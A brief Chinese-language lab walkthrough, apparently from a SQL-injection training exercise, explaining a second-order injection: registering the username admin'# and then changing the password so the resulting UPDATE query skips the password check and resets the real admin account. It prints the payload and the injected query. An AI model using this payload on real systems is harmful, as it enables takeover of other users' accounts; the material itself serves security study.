"""
这一关就是先注册一个用户名，例如像admin'#，这样，然后点修改密码，此时数据库查询语句是这样的：
UPDATE users SET passwd="New_Pass" WHERE username ='admin' # ' AND password=''
此时，单引号闭合sql语句，#注释掉了后面的语句，即可修改原来admin的帐号

"""
